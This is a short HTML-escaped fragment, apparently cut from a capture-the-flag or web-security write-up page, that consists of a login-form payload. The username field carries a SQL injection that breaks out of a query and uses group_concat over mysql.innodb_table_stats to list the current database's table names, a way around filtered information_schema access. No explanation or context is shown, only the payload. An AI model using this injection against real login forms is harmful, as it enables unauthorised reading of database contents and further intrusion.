&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;username=1&amp;#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));#

password=1
